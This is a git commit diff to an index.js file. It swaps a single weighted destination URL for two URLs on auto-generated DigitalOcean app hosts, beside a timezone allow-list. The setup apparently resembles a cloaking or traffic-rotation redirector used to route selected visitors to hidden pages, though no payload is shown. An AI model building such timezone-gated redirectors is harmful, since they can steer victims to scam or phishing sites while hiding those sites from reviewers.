54f666109c9e30a98e57742aaa5ea8fc13505b28
paalakash <palaksh452@gmail.com>
2026-06-28 07:10:50 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-l5au6.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://seal-app-qpugd.ondigitalocean.app/index.html", weight: 0.5 },
+    { url: "https://sea-turtle-app-2pwvz.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 0.5 }
 
 ];
 
